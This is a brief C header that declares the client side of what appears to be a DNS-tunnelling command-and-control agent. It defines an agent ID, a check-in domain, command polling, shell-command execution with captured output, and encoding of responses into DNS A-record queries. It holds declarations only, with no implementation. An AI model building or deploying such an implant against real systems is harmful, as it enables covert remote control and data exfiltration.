#ifndef GODOH_CLIENT_H
#define GODOH_CLIENT_H

typedef enum {
    Idle,
    Error,
    Command,
} status_t;

typedef struct Client {
    char *domain;

    char *agent_id;
    char *agent_id_hex;
    char checkin_domain[256];

    char *command;

    status_t status;
} client_t;

struct Client *init_client();

void reset_command(client_t *client);

int send_response(client_t *client, char **data, int data_count);

int poll(client_t *client);

char *shell_exec_output(const char *cmd);

char *str_to_response_bytes(client_t *client, char *res, int *res_length);

char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len);

#endif //GODOH_CLIENT_H

